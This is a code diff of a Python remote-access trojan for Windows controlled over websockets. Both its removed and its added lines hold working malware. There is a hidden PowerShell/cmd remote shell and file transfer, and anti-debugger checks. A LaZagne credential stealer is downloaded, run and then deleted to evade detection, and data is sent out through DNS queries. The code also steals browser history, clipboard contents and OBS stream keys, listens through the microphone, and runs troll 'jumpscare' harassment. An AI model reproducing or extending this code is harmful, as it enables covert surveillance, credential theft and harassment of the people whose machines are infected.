-    """Dynamically change the screen stream FPS."""
-    fps = int(msg.get("fps", 30))
-    fps = max(1, min(60, fps))  # clamp 1–60
-    st.stream_fps = fps
-    log(f"[STREAM] FPS set to {fps}")
-    await send(ws, {"t": "info", "msg": f"Stream FPS set to {fps}"})
-
-
-@register_command("ss_stop")
-async def cmd_ss_stop(msg, ws):
-    st.streaming = False
-
-
-@register_command("shell")
-async def cmd_shell(msg, ws):
-    cmd = (msg.get("c") or msg.get("cmd") or "").strip()
-    if not cmd:
-        return
-    await send(ws, {"t": "shell_out", "data": f"> {cmd}\n"})
-    try:
-        def run_proc():
-            # Try PowerShell first (preferred — richer output)
+# ─────────────────────────────────────────────────────────────────────────────
+# CLIPBOARD RELAY
+# ─────────────────────────────────────────────────────────────────────────────
+async def clipboard_relay_loop(ws):
+    last = ""
+    while True:
+        if st.clipboard_monitor:
             try:
-                p = subprocess.run(
-                    ["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", cmd],
-                    capture_output=True,
-                    text=True,
-                    encoding="utf-8",
-                    errors="replace",
-                    timeout=30,
-                    creationflags=0x08000000,
-                )
-                out = (p.stdout or "") + (p.stderr or "")
-            except Exception as ps_e:
-                out = f"[PS Error: {ps_e}] — Falling back to cmd.exe\n"
-            # If PS gave nothing, fall back to cmd.exe
-            if not out.strip():
-                try:
-                    p2 = subprocess.run(
-                        ["cmd.exe", "/c", cmd],
-                        capture_output=True,
-                        text=True,
-                        encoding="utf-8",
-                        errors="replace",
-                        timeout=15,
-                        creationflags=0x08000000,
-                    )
-                    out = (p2.stdout or "") + (p2.stderr or "")
-                except Exception as ce:
-                    out = f"[CMD Error: {ce}]\n"
-            return out or "(no output)\n"
-
-        out = await asyncio.to_thread(run_proc)
-        await send(ws, {"t": "shell_out", "data": out})
-    except Exception as e:
-        await send(ws, {"t": "shell_out", "data": f"[ERROR] {e}\n"})
+                if recon is not None:
+                    cur = await asyncio.to_thread(recon.get_clipboard)
+                    if cur and cur != last:
+                        last = cur
+                        await send(ws, {"t": "clipboard_update", "data": cur})
+            except: pass
+            await asyncio.sleep(1.2)
+        else:
+            await asyncio.sleep(2)
 
 
-@register_command("ls")
-async def cmd_ls(msg, ws):
-    path = msg.get("path", "C:\\")
-    try:
-        import datetime
-        files = []
-        # Sort: dirs first, then files alphabetically
-        entries = sorted(os.scandir(path), key=lambda e: (not e.is_dir(), e.name.lower()))
-        for entry in entries:
-            try:
-                s = entry.stat()
-                files.append({
-                    "name": entry.name,
-                    "path": entry.path,
-                    "type": "dir" if entry.is_dir() else "file",
-                    "is_dir": entry.is_dir(),
-                    "size": s.st_size,
-                    "mod": datetime.datetime.fromtimestamp(s.st_mtime).strftime("%Y-%m-%d %H:%M"),
-                })
-            except:
-                pass
-        await send(ws, {"t": "fs_resp", "items": files, "path": path})
-    except PermissionError:
-        await send(ws, {"t": "fs_resp", "items": [], "path": path, "error": "Access denied"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"FS Error: {e}"})
-
-
-@register_command("download_file")
-async def cmd_download_file(msg, ws):
-    """Sends a file to the dashboard as base64."""
-    import base64, os
-    path = msg.get("path", "")
-    def _run():
+# ── Heartbeat ─────────────────────────────────────────────────────────────────
+async def heartbeat_loop(ws, uid):
+    while True:
         try:
-            size = os.path.getsize(path)
-            if size > 50 * 1024 * 1024:  # 50MB limit
-                asyncio.run_coroutine_threadsafe(
-                    send(ws, {"t": "info", "msg": f"File too large ({size//1024//1024}MB). Max 50MB."}), global_loop)
-                return
-            with open(path, "rb") as f:
-                raw = f.read()
-            b64 = base64.b64encode(raw).decode()
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "file_download", "name": os.path.basename(path), "b64": b64}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"download_file error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
+            await asyncio.sleep(15)
+            await send(ws, {"t": "ping", "id": uid})
+        except: break
 
-
-@register_command("upload_file")
-async def cmd_upload_file(msg, ws):
-    """Receives a base64 encoded file from the dashboard and saves it."""
-    import base64, os
-    name = msg.get("name", "uploaded_file")
-    data = msg.get("data", "")
-    path = msg.get("path", os.path.join(os.environ.get("TEMP", "C:\\Temp"), name))
+# ─────────────────────────────────────────────────────────────────────────────
+# WALLPAPER
+# ─────────────────────────────────────────────────────────────────────────────
+def _set_wallpaper(data: bytes):
     try:
-        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
-        with open(path, "wb") as f:
-            f.write(base64.b64decode(data))
-        await send(ws, {"t": "info", "msg": f"✅ Uploaded: {path} ({os.path.getsize(path)//1024}KB)"})
+        fd, path = tempfile.mkstemp(suffix=".jpg")
+        os.close(fd)
+        with open(path, "wb") as f: f.write(data)
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
+        return True
+    except: return False
+
+# ─────────────────────────────────────────────────────────────────────────────
+# JUMPSCARE
+# ─────────────────────────────────────────────────────────────────────────────
+def _jumpscare(data: bytes):
+    """Display image fullscreen using PowerShell + Windows Forms."""
+    try:
+        fd, path = tempfile.mkstemp(suffix=".jpg")
+        os.close(fd)
+        with open(path, "wb") as f: f.write(data)
+        ps = f"""
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$img  = [System.Drawing.Image]::FromFile('{path}')
+$form = New-Object System.Windows.Forms.Form
+$form.FormBorderStyle = 'None'
+$form.WindowState = 'Maximized'
+$form.TopMost = $true
+$pb = New-Object System.Windows.Forms.PictureBox
+$pb.Dock = 'Fill'
+$pb.Image = $img
+$pb.SizeMode = 'StretchImage'
+$form.Controls.Add($pb)
+$form.Show()
+Start-Sleep -Seconds 5
+$form.Close()
+"""
+        subprocess.Popen(
+            ["powershell.exe", "-NoProfile", "-NonInteractive",
+             "-ExecutionPolicy", "Bypass", "-Command", ps],
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        return True
+    except: return False
+
+def minimize_all_windows():
+    try:
+        VK_LWIN = 0x5B
+        KEYEVENTF_KEYUP = 0x0002
+        ctypes.windll.user32.keybd_event(VK_LWIN, 0, 0, 0)
+        ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)
+        ctypes.windll.user32.keybd_event(0x44, 0, KEYEVENTF_KEYUP, 0)
+        ctypes.windll.user32.keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)
     except Exception as e:
-        await send(ws, {"t": "info", "msg": f"upload_file error: {e}"})
+        log(f"[MinimizeAll] Error: {e}")
 
-
-
-@register_command("mm")
-async def cmd_mm(msg, ws):
-    """Mouse move — multi-monitor aware."""
-    if input_hub:
-        mon_idx = getattr(st, "monitor_idx", 0)
-        try:
-            if mon_idx > 0:
-                import mss as _mss
-
-                with _mss.mss() as _sct:
-                    mon = _sct.monitors[mon_idx + 1]  # monitors[1]=primary
-                    px = mon["left"] + int(float(msg["x"]) * mon["width"])
-                    py = mon["top"] + int(float(msg["y"]) * mon["height"])
-            else:
-                px = int(float(msg["x"]) * input_hub.screen_width)
-                py = int(float(msg["y"]) * input_hub.screen_height)
-        except:
-            px = int(float(msg["x"]) * input_hub.screen_width)
-            py = int(float(msg["y"]) * input_hub.screen_height)
-        asyncio.get_running_loop().run_in_executor(None, input_hub.mouse_move, px, py)
-
-
-@register_command("mc")
-async def cmd_mc(msg, ws):
-    """Mouse click — multi-monitor aware, moves then clicks."""
-    if input_hub:
-        mon_idx = getattr(st, "monitor_idx", 0)
-        try:
-            if mon_idx > 0:
-                import mss as _mss
-
-                with _mss.mss() as _sct:
-                    mon = _sct.monitors[mon_idx + 1]
-                    px = mon["left"] + int(float(msg.get("x", 0)) * mon["width"])
-                    py = mon["top"] + int(float(msg.get("y", 0)) * mon["height"])
-            else:
-                px = int(float(msg.get("x", 0)) * input_hub.screen_width)
-                py = int(float(msg.get("y", 0)) * input_hub.screen_height)
-        except:
-            b_str = (
-                "left"
-                if msg.get("b", 0) == 0
-                else ("middle" if msg.get("b") == 1 else "right")
-            )
-            pressed = msg.get("p", 1) == 1
-            loop = asyncio.get_running_loop()
-            loop.run_in_executor(None, input_hub.mouse_move, px, py)
-            loop.run_in_executor(None, input_hub.mouse_click, b_str, pressed)
-
-
-
-
-@register_command("troll")
-async def cmd_troll(msg, ws):
-    """Centralized troll handler that uses deferred loading of modules.fun."""
-    from modules import fun
-    action = msg.get("action") or msg.get("cmd", "")
-    value = msg.get("val") if "val" in msg else msg.get("value", "")
-    
-    # Normalize jumpscare fields — HTML sends 'val' for image URL
-    if action in ("jumpscare", "jumpscare_pro"):
-        if "val" in msg and "image" not in msg:
-            msg["image"] = msg["val"]
-    
-    # Delegate to the refactored fun module
-    fun.troll_action(action, value, msg)
-
-
-# ── PYSILON ANTI-ANALYSIS ───────────────────────────────────────────────────
-def run_anti_analysis():
-    """Runs PySilon-style anti-analysis checks to avoid VMs/Sandboxes."""
-    import sys
+# ─────────────────────────────────────────────────────────────────────────────
+# ELITE INTEGRATIONS
+# ─────────────────────────────────────────────────────────────────────────────
+def _speak(text):
     try:
-        # 1. Check for common virtualization Mac OUI / Registry keys
-        # Simple fallback: check total RAM (sandboxes often have very little)
-        import psutil
-        if psutil.virtual_memory().total < (2 * 1024**3):
-            log("[ANTI-ANALYSIS] Less than 2GB RAM. Possible sandbox.")
-            
-        # 2. Check for debugger presence
-        from ctypes import windll
-        if windll.kernel32.IsDebuggerPresent():
-            log("[ANTI-ANALYSIS] Debugger detected. Exiting.")
-            sys.exit(0)
+        import pyttsx3
+        engine = pyttsx3.init()
+        engine.say(text)
+        engine.runAndWait()
     except: pass
 
-run_anti_analysis()
-
-# ── STEALTH COMMANDS (PyExfil / LaZagne) ────────────────────────────────────
-
-@register_command("lazagne")
-async def cmd_lazagne(msg, ws):
-    """
-    Downloads LaZagne.exe dynamically to a temporary path, executes to extract 
-    credentials, exfiltrates results, and deletes the payload.
-    """
-    await send(ws, {"t": "info", "msg": "Initiating LaZagne credential extraction..."})
-    import tempfile
-    import os
-    import urllib.request
-    
-    def _run_lazagne():
-        try:
-            exe_path = os.path.join(tempfile.gettempdir(), "lz_sys.exe")
-            # Download latest release of LaZagne
-            url = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/lazagne.exe"
-            urllib.request.urlretrieve(url, exe_path)
-            
-            # Execute silently and capture output
-            proc = subprocess.Popen(
-                [exe_path, "all"], 
-                stdout=subprocess.PIPE, 
-                stderr=subprocess.PIPE,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            out, err = proc.communicate(timeout=60)
-            
-            # Delete payload to evade detection
-            try: os.remove(exe_path)
-            except: pass
-            
-            # Send results back
-            res = out.decode(errors='ignore')
-            if not res.strip():
-                res = "No credentials found or execution blocked."
-                
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"LaZagne Results:\n{res[:2000]}..."}),
-                global_loop
-            )
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"LaZagne failed: {e}"}),
-                global_loop
-            )
-
-    global_loop.run_in_executor(None, _run_lazagne)
-
-
-@register_command("exfil_dns")
-async def cmd_exfil_dns(msg, ws):
-    """
-    PyExfil inspired DNS Exfiltration.
-    Encodes data in base32 and sends it as DNS queries to a controlled nameserver.
-    """
-    data = msg.get("data", "PING")
-    domain = msg.get("domain", "example.com") # User provides their nameserver domain
-    
-    await send(ws, {"t": "info", "msg": f"Initiating DNS Exfiltration to {domain}..."})
-    
-    def _run_dns_exfil():
-        try:
-            import base64
-            import socket
-            
-            # Base32 is case-insensitive and safe for DNS labels
-            encoded = base64.b32encode(data.encode()).decode().strip("=").lower()
-            
-            # Split into chunks of 63 characters (DNS label limit)
-            chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
-            
-            for i, chunk in enumerate(chunks):
-                query = f"{i}.{chunk}.{domain}"
-                try:
-                    socket.gethostbyname(query)
-                except:
-                    pass # We expect failure if there's no actual A record
-                time.sleep(0.1) # Prevent flooding
-                
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"DNS Exfil complete. {len(chunks)} packets sent."}),
-                asyncio.get_event_loop()
-            )
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"DNS Exfil failed: {e}"}),
-                asyncio.get_event_loop()
-            )
-
-    asyncio.get_running_loop().run_in_executor(None, _run_dns_exfil)
-
-
-@register_command("ps_list")
-async def cmd_ps_list(msg, ws):
+def _recognize():
     try:
-        import psutil
+        import speech_recognition as sr
+        r = sr.Recognizer()
+        with sr.Microphone() as source:
+            audio = r.listen(source, timeout=5)
+        return r.recognize_google(audio)
+    except: return "Error or No Speech"
 
-        procs = []
-        for p in psutil.process_iter(
-            ["pid", "name", "username", "cpu_percent", "memory_info"]
-        ):
-            try:
-                pinfo = p.info
-                procs.append(
-                    {
-                        "pid": pinfo["pid"],
-                        "name": pinfo["name"],
-                        "user": pinfo["username"] or "SYSTEM",
-                        "cpu": f"{pinfo['cpu_percent']}%",
-                        "mem": f"{round(pinfo['memory_info'].rss / (1024 * 1024), 1)} MB",
-                    }
-                )
-            except:
-                pass
-        await send(ws, {"t": "ps_resp", "data": procs})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"PS Error: {e}"})
+def _msgbox(text):
+    try: ctypes.windll.user32.MessageBoxW(0, text, "System Notification", 0x40 | 0x1)
+    except: pass
 
-
-@register_command("ps_kill")
-async def cmd_ps_kill(msg, ws):
+def _get_stream_keys():
+    keys = {"obs": None, "slobs": None}
     try:
-        import psutil
+        obs_path = os.path.expanduser("~\\AppData\\Roaming\\obs-studio\\basic\\profiles")
+        if os.path.exists(obs_path):
+            for root, dirs, files in os.walk(obs_path):
+                for f in files:
+                    if f.endswith(".json"):
+                        with open(os.path.join(root, f), "r", encoding="utf-8") as file:
+                            data = json.load(file)
+                            if "settings" in data and "key" in data["settings"]:
+                                keys["obs"] = data["settings"]["key"]
+        slobs = os.path.expanduser("~\\AppData\\Roaming\\slobs-client\\settings\\service.json")
+        if os.path.exists(slobs):
+            keys["slobs"] = json.load(open(slobs)).get("key")
+    except: pass
+    return keys
 
-        pid = int(msg.get("pid", 0))
-        if pid:
-            psutil.Process(pid).kill()
-            await send(ws, {"t": "info", "msg": f"Killed {pid}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Kill Error: {e}"})
-
-@register_command("ps_suspend")
-async def cmd_ps_suspend(msg, ws):
+async def _play_video(url):
     try:
-        import psutil
-        pid = int(msg.get("pid", 0))
-        if pid:
-            psutil.Process(pid).suspend()
-            await send(ws, {"t": "info", "msg": f"Suspended {pid}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Suspend Error: {e}"})
+        fd, path = tempfile.mkstemp(suffix=".mp4")
+        os.close(fd)
+        urllib.request.urlretrieve(url, path)
+        os.startfile(path)
+    except: pass
 
-@register_command("ps_resume")
-async def cmd_ps_resume(msg, ws):
+async def _loop_sound(url):
     try:
-        import psutil
-        pid = int(msg.get("pid", 0))
-        if pid:
-            psutil.Process(pid).resume()
-            await send(ws, {"t": "info", "msg": f"Resumed {pid}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Resume Error: {e}"})
+        import pygame
+        fd, path = tempfile.mkstemp(suffix=".mp3")
+        os.close(fd)
+        urllib.request.urlretrieve(url, path)
+        pygame.mixer.init()
+        pygame.mixer.music.load(path)
+        pygame.mixer.music.play(-1)
+        while getattr(st, "loopsound_active", False):
+            await asyncio.sleep(1)
+        pygame.mixer.music.stop()
+        os.remove(path)
+    except: pass
 
-
-@register_command("kd")
-async def cmd_kd(msg, ws):
-    """Key down/up — immediate, not queued behind frame encoding."""
-    if input_hub:
-        key = msg.get("key", "")
-        code = msg.get("code", "")
-        down = msg.get("down", True)
-        effective_key = (
-            key if key else (code.replace("Key", "").lower() if code else "")
-        )
-        if effective_key:
-            asyncio.get_running_loop().run_in_executor(
-                None, input_hub.key_event, effective_key, down
-            )
-
-
-@register_command("scroll")
-async def cmd_scroll(msg, ws):
-    if input_hub:
-        delta = msg.get("delta", 0)
-        asyncio.get_running_loop().run_in_executor(
-            None, input_hub.mouse_scroll, -delta / 100
-        )
-@register_command("kill_explorer")
-async def cmd_kill_explorer(msg, ws):
-    subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"], capture_output=True)
-    await send(ws, {"t": "info", "msg": "Explorer killed."})
-
-@register_command("recycle_bin")
-async def cmd_recycle_bin(msg, ws):
-    ps = 'Clear-RecycleBin -Force -ErrorAction SilentlyContinue'
-    subprocess.run(["powershell", "-Command", ps], capture_output=True)
-    await send(ws, {"t": "info", "msg": "Recycle bin emptied."})
-
-@register_command("whoami")
-async def cmd_whoami(msg, ws):
-    import getpass
-    import socket
-    res = f"{socket.gethostname()}\\{getpass.getuser()}"
-    await send(ws, {"t": "info", "msg": f"Target User: {res}"})
-
-@register_command("drives")
-async def cmd_drives(msg, ws):
-    import psutil
-    drvs = [d.device for d in psutil.disk_partitions()]
-    await send(ws, {"t": "info", "msg": f"Active Drives: {', '.join(drvs)}"})
-
-# ── 20 NEW APEX COMMANDS ────────────────────────────────────────────────────
-
-@register_command("screenshot_snap")
-async def cmd_screenshot_snap(msg, ws):
-    """Instant full-res screenshot sent as base64 image."""
-    def _snap():
-        try:
-            import mss, base64, io
-            from PIL import Image
-            with mss.mss() as sct:
-                mon = sct.monitors[1]
-                img = sct.grab(mon)
-                pil = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
-                buf = io.BytesIO()
-                pil.save(buf, format="JPEG", quality=82)
-                b64 = base64.b64encode(buf.getvalue()).decode()
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "webcam_img", "data": b64}), global_loop
-            )
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Screenshot failed: {e}"}), global_loop
-            )
-    asyncio.get_running_loop().run_in_executor(None, _snap)
-
-
-@register_command("clipboard_get")
-async def cmd_clipboard_get(msg, ws):
-    """Reads the target's clipboard text."""
+# ─────────────────────────────────────────────────────────────────────────────
+# VOLUME
+# ─────────────────────────────────────────────────────────────────────────────
+def _set_volume(level):
     try:
-        import subprocess
-        out = subprocess.run(
-            ["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
-            capture_output=True, encoding="utf-8", errors="replace", timeout=5
-        )
-        text = out.stdout.strip() or "(empty)"
-        await send(ws, {"t": "shell_out", "data": f"📋 Clipboard:\n{text}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Clipboard read failed: {e}"})
-
-
-@register_command("clipboard_set")
-async def cmd_clipboard_set(msg, ws):
-    """Writes text to the target clipboard."""
-    text = msg.get("text", "")
-    try:
-        subprocess.run(
-            ["powershell", "-NoProfile", "-Command",
-             f"Set-Clipboard -Value '{text.replace(chr(39), chr(34))}'"],
-            capture_output=True, timeout=5
-        )
-        await send(ws, {"t": "info", "msg": f"✅ Clipboard set to: {text[:60]}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Clipboard write failed: {e}"})
-
-
-@register_command("active_window")
-async def cmd_active_window(msg, ws):
-    """Returns the title of the currently focused window."""
-    try:
-        import ctypes
-        hwnd = ctypes.windll.user32.GetForegroundWindow()
-        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
-        buf = ctypes.create_unicode_buffer(length + 1)
-        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
-        title = buf.value or "(no title)"
-        await send(ws, {"t": "active_window", "title": title})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Active window failed: {e}"})
-
-
-@register_command("lock_screen")
-async def cmd_lock_screen(msg, ws):
-    """Locks the Windows workstation."""
-    try:
-        import ctypes
-        ctypes.windll.user32.LockWorkStation()
-        await send(ws, {"t": "info", "msg": "🔒 Workstation locked."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Lock failed: {e}"})
-
-
-@register_command("open_url")
-async def cmd_open_url(msg, ws):
-    """Opens a URL in the default browser silently."""
-    url = msg.get("url", "")
-    if not url:
-        await send(ws, {"t": "info", "msg": "No URL provided."}); return
-    try:
-        subprocess.Popen(["cmd", "/c", "start", "", url],
-                         creationflags=subprocess.CREATE_NO_WINDOW)
-        await send(ws, {"t": "info", "msg": f"🌐 Opened: {url}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Open URL failed: {e}"})
-
-
-@register_command("run_program")
-async def cmd_run_program(msg, ws):
-    """Runs any program/command silently on the target."""
-    exe = msg.get("path", "") or msg.get("cmd", "")
-    if not exe:
-        await send(ws, {"t": "info", "msg": "No path/cmd provided."}); return
-    try:
-        subprocess.Popen(exe, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        await send(ws, {"t": "info", "msg": f"▶ Launched: {exe}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Run failed: {e}"})
-
-
-@register_command("list_startup")
-async def cmd_list_startup(msg, ws):
-    """Lists HKCU and HKLM startup registry entries."""
-    try:
-        import winreg
-        results = []
-        paths = [
-            (winreg.HKEY_CURRENT_USER,  r"Software\Microsoft\Windows\CurrentVersion\Run"),
-            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
-        ]
-        for hive, path in paths:
-            hive_name = "HKCU" if hive == winreg.HKEY_CURRENT_USER else "HKLM"
-            try:
-                with winreg.OpenKey(hive, path, 0, winreg.KEY_READ) as k:
-                    i = 0
-                    while True:
-                        try:
-                            name, val, _ = winreg.EnumValue(k, i)
-                            results.append(f"[{hive_name}] {name}: {val}")
-                            i += 1
-                        except OSError:
-                            break
-            except Exception:
-                pass
-        text = "\n".join(results) or "No startup entries found."
-        await send(ws, {"t": "shell_out", "data": f"🚀 Startup Programs:\n{text}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Startup list failed: {e}"})
-
-
-@register_command("get_installed")
-async def cmd_get_installed(msg, ws):
-    """Returns a list of installed programs via the registry."""
-    def _run():
-        try:
-            import winreg
-            apps = []
-            paths = [
-                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
-                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
-                (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
-            ]
-            for hive, path in paths:
-                try:
-                    with winreg.OpenKey(hive, path) as k:
-                        for i in range(winreg.QueryInfoKey(k)[0]):
-                            try:
-                                sub = winreg.OpenKey(k, winreg.EnumKey(k, i))
-                                name = winreg.QueryValueEx(sub, "DisplayName")[0]
-                                try: ver = winreg.QueryValueEx(sub, "DisplayVersion")[0]
-                                except: ver = ""
-                                if name.strip():
-                                    apps.append(f"{name}  {ver}".strip())
-                            except Exception:
-                                pass
-                except Exception:
-                    pass
-            apps = sorted(set(apps))
-            text = "\n".join(apps[:200]) or "None found."
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": f"📦 Installed ({len(apps)}):\n{text}"}), global_loop
-            )
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Installed list failed: {e}"}), global_loop
-            )
-    asyncio.get_running_loop().run_in_executor(None, _run)
-
-
-@register_command("browser_history")
-async def cmd_browser_history(msg, ws):
-    """Pulls recent browser history from Chrome/Edge/Firefox."""
-    def _run():
-        import sqlite3, shutil, tempfile, os, glob
-        results = []
-        profiles = []
-        # Chrome
-        profiles += glob.glob(os.path.expandvars(
-            r"%LOCALAPPDATA%\Google\Chrome\User Data\*\History"))
-        # Edge
-        profiles += glob.glob(os.path.expandvars(
-            r"%LOCALAPPDATA%\Microsoft\Edge\User Data\*\History"))
-        for db_path in profiles:
-            try:
-                fd, tmp = tempfile.mkstemp(suffix=".db")
-                os.close(fd)
-                shutil.copy2(db_path, tmp)
-                con = sqlite3.connect(tmp)
-                cur = con.execute(
-                    "SELECT url, title, last_visit_time FROM urls "
-                    "ORDER BY last_visit_time DESC LIMIT 30"
-                )
-                for url, title, _ in cur.fetchall():
-                    results.append(f"{title or url}")
-                con.close()
-                os.unlink(tmp)
-            except Exception:
-                pass
-        text = "\n".join(results[:60]) or "No history found."
-        asyncio.run_coroutine_threadsafe(
-            send(ws, {"t": "shell_out", "data": f"🌐 Browser History:\n{text}"}), global_loop
-        )
-    asyncio.get_running_loop().run_in_executor(None, _run)
-
-
-@register_command("env_vars")
-async def cmd_env_vars(msg, ws):
-    """Returns all environment variables."""
-    try:
-        lines = [f"{k}={v}" for k, v in sorted(os.environ.items())]
-        await send(ws, {"t": "shell_out", "data": "\n".join(lines)})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Env vars failed: {e}"})
-
-
-@register_command("disk_usage")
-async def cmd_disk_usage(msg, ws):
-    """Returns per-drive disk usage."""
-    try:
-        import psutil
-        lines = []
-        for p in psutil.disk_partitions():
-            try:
-                u = psutil.disk_usage(p.mountpoint)
-                pct = u.percent
-                bar = "█" * int(pct // 5) + "░" * (20 - int(pct // 5))
-                lines.append(f"{p.device:<6} [{bar}] {pct:.1f}%  "
-                             f"{u.used//1073741824:.1f}/{u.total//1073741824:.1f} GB")
-            except Exception:
-                pass
-        await send(ws, {"t": "shell_out", "data": "💾 Disk Usage:\n" + "\n".join(lines)})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Disk usage failed: {e}"})
-
-
-@register_command("type_text")
-async def cmd_type_text(msg, ws):
-    """Types a string using pynput keyboard."""
-    text = msg.get("text", "")
-    def _type():
-        try:
-            from pynput.keyboard import Controller as KbCtrl
-            kb = KbCtrl()
-            kb.type(text)
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"⌨ Typed: {text[:40]}"}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Type text failed: {e}"}), global_loop)
-    asyncio.get_running_loop().run_in_executor(None, _type)
-
-
-@register_command("press_key")
-async def cmd_press_key(msg, ws):
-    """Sends a key combo via pynput (e.g. 'win', 'alt+f4', 'ctrl+shift+esc')."""
-    combo = msg.get("keys", "")
-    def _press():
-        try:
-            from pynput.keyboard import Controller as KbCtrl, Key
-            kb = KbCtrl()
-            KEY_MAP = {
-                "win": Key.cmd, "ctrl": Key.ctrl, "alt": Key.alt,
-                "shift": Key.shift, "tab": Key.tab, "enter": Key.enter,
-                "esc": Key.esc, "f4": Key.f4, "f5": Key.f5, "f11": Key.f11,
-                "delete": Key.delete, "backspace": Key.backspace,
-                "space": Key.space, "up": Key.up, "down": Key.down,
-                "left": Key.left, "right": Key.right,
-            }
-            parts = [p.strip().lower() for p in combo.split("+")]
-            keys = [KEY_MAP.get(p, p) for p in parts]
-            for k in keys:
-                kb.press(k)
-            for k in reversed(keys):
-                kb.release(k)
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"🔑 Key combo sent: {combo}"}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Key press failed: {e}"}), global_loop)
-    asyncio.get_running_loop().run_in_executor(None, _press)
-
-
-@register_command("hide_taskbar")
-async def cmd_hide_taskbar(msg, ws):
-    """Hides or shows the Windows taskbar."""
-    hide = msg.get("hide", True)
-    try:
-        import ctypes
-        SW_HIDE, SW_SHOW = 0, 5
-        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
-        ctypes.windll.user32.ShowWindow(hwnd, SW_HIDE if hide else SW_SHOW)
-        state = "hidden" if hide else "restored"
-        await send(ws, {"t": "info", "msg": f"🪟 Taskbar {state}."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Taskbar toggle failed: {e}"})
-
-
-@register_command("swap_mouse")
-async def cmd_swap_mouse(msg, ws):
-    """Swaps left/right mouse buttons."""
-    swap = msg.get("swap", True)
-    try:
-        import ctypes
-        ctypes.windll.user32.SwapMouseButton(1 if swap else 0)
-        await send(ws, {"t": "info", "msg": f"🖱 Mouse buttons {'swapped' if swap else 'restored'}."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Mouse swap failed: {e}"})
-
-
-@register_command("play_beep")
-async def cmd_play_beep(msg, ws):
-    """Plays a system beep at given frequency and duration."""
-    freq = int(msg.get("freq", 880))
-    dur  = int(msg.get("dur", 500))
-    def _beep():
-        try:
-            import ctypes
-            ctypes.windll.kernel32.Beep(freq, dur)
-        except Exception: pass
-    asyncio.get_running_loop().run_in_executor(None, _beep)
-    await send(ws, {"t": "info", "msg": f"🔔 Beep: {freq}Hz × {dur}ms"})
-
-
-@register_command("toast_notify")
-async def cmd_toast_notify(msg, ws):
-    """Shows a Windows 10/11 toast notification on the target."""
-    title = msg.get("title", "Alert")
-    body  = msg.get("body",  "Message from operator.")
-    def _toast():
-        try:
-            from windows_toasts import Toast, WindowsToaster
-            toaster = WindowsToaster("Windows")
-            t = Toast()
-            t.text_fields = [title, body]
-            toaster.show_toast(t)
-        except Exception:
-            # Fallback: PowerShell notification
-            ps = (
-                f"[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType=WindowsRuntime] | Out-Null;"
-                f"$xml = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent('ToastText02');"
-                f"$xml.GetElementsByTagName('text')[0].AppendChild($xml.CreateTextNode('{title}')) | Out-Null;"
